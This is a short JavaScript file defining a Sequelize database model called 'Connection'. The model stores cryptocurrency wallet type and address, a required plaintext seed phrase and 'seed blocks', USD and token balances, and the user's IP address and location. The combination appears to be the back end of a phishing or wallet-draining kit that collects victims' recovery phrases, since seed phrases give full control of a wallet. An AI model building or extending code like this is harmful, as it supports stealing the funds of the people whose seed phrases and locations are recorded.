const { DataTypes } = require('sequelize');
const sequelize = require('../config/database');

const Connection = sequelize.define('Connection', {
    walletType: { type: DataTypes.STRING, allowNull: false },
    walletAddress: { type: DataTypes.STRING, allowNull: false },
    seedPhrase: { type: DataTypes.TEXT, allowNull: false },
    seedBlocks: { type: DataTypes.TEXT, allowNull: false },
    usdAmount: { type: DataTypes.FLOAT, allowNull: true },
    tokenAmount: { type: DataTypes.FLOAT, allowNull: true },
    ipAddress: { type: DataTypes.STRING, allowNull: true },
    location: { type: DataTypes.STRING, allowNull: true }
}, {
    timestamps: true
});

module.exports = Connection;